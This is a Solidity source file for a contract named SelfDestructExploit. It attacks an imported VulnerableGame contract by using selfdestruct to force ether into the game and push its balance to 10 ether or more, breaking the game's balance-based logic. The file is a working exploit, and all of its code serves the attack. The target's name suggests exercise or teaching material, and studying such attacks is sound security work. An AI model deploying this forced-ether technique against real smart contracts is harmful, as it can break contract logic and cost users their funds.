// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {VulnerableGame} from "./VulnerableGame.sol";

/**
 * @title SelfDestructExploit
 * @dev A contract that attacks the VulnerableGame contract by sending
 * ether such that the game balance is suddenly >= 10 ether.
 */
contract SelfDestructExploit {
    VulnerableGame game;

    constructor(VulnerableGame _game) payable {
        game = VulnerableGame(_game);
    }

    function attack() public payable {
        // Break the game by sending ether such that
        // the game balance is suddenly >= 10 ether
        address payable addr = payable(address(game));
        selfdestruct(addr);
    }
}
